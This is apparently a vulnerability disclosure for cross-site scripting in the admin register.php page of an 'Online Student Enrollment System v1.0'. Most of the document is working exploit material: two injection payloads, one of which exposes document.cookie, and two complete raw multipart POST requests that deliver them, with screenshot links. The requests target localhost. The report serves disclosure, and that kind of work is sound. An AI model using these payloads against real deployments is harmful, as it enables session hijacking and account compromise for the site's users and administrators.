# Online Student Enrollment System v1.0 by donbermoy has Cross-site scripting

BUG_Author: mkwsj007

vendors:https://www.sourcecodester.com/php/14281/online-student-enrollment-system-using-phpmysqli.html

Vulnerability File: /student_enrollment/admin/register.php

POST parameter 'name' exists Cross-site scripting vulnerability

Payload1: a"><script>alert(1)</script>b

![image](https://github.com/mkwsj007/pic/blob/main/one.png)

```
POST /student_enrollment/admin/register.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 797
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMkbv5jtnvqBtc9PG
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/student_enrollment/admin/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=j9loi161fde5rq6oo1jkuelrcn
Connection: close

------WebKitFormBoundaryMkbv5jtnvqBtc9PG
Content-Disposition: form-data; name="name"

a"><script>alert(1)</script>b
------WebKitFormBoundaryMkbv5jtnvqBtc9PG
Content-Disposition: form-data; name="email"

c@gmail.com
------WebKitFormBoundaryMkbv5jtnvqBtc9PG
Content-Disposition: form-data; name="username"

d
------WebKitFormBoundaryMkbv5jtnvqBtc9PG
Content-Disposition: form-data; name="password"

e
------WebKitFormBoundaryMkbv5jtnvqBtc9PG
Content-Disposition: form-data; name="c_password"

e
------WebKitFormBoundaryMkbv5jtnvqBtc9PG
Content-Disposition: form-data; name="photo"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryMkbv5jtnvqBtc9PG
Content-Disposition: form-data; name="register"


------WebKitFormBoundaryMkbv5jtnvqBtc9PG--
```

![image](https://github.com/mkwsj007/pic/blob/main/two.png)

Payload2: a"><script>alert(document.cookie)</script>b

![image](https://github.com/mkwsj007/pic/blob/main/three.png)

```
POST /student_enrollment/admin/register.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 811
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryo4AaLx6Ali4mxyDj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/student_enrollment/admin/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=j9loi161fde5rq6oo1jkuelrcn
Connection: close

------WebKitFormBoundaryo4AaLx6Ali4mxyDj
Content-Disposition: form-data; name="name"

a"><script>alert(document.cookie)</script>b
------WebKitFormBoundaryo4AaLx6Ali4mxyDj
Content-Disposition: form-data; name="email"

c@gmail.com
------WebKitFormBoundaryo4AaLx6Ali4mxyDj
Content-Disposition: form-data; name="username"

d
------WebKitFormBoundaryo4AaLx6Ali4mxyDj
Content-Disposition: form-data; name="password"

e
------WebKitFormBoundaryo4AaLx6Ali4mxyDj
Content-Disposition: form-data; name="c_password"

e
------WebKitFormBoundaryo4AaLx6Ali4mxyDj
Content-Disposition: form-data; name="photo"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryo4AaLx6Ali4mxyDj
Content-Disposition: form-data; name="register"


------WebKitFormBoundaryo4AaLx6Ali4mxyDj--
```

![image](https://github.com/mkwsj007/pic/blob/main/cookie.png)
